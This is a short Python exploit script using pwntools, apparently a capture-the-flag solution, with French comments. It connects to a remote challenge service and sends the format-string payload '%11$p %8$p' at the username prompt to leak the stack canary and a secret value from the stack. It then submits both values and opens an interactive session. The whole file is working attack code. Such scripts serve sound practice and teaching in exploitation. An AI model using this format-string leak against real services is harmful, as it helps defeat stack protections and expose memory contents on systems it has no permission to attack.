#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

p = remote("cytech.tcdn.casa", 4402)
# on veut leaker secret et canary
# le canary est a [RSP+40], donc 11eme argument printf
# le secret est a [RSP+16], donc 8eme argument printf
p.sendlineafter(b"username: ", b"%11$p %8$p")
_, canary, secret = p.recvline().strip().split()
canary = signed(int(canary, 16))
log.info(f"canary={canary}")
secret = signed(int(secret, 16))
log.info(f"secret={secret}")

p.sendlineafter(b"secret: ", str(secret).encode())
p.sendlineafter(b"canary: ", str(canary).encode())
p.interactive()
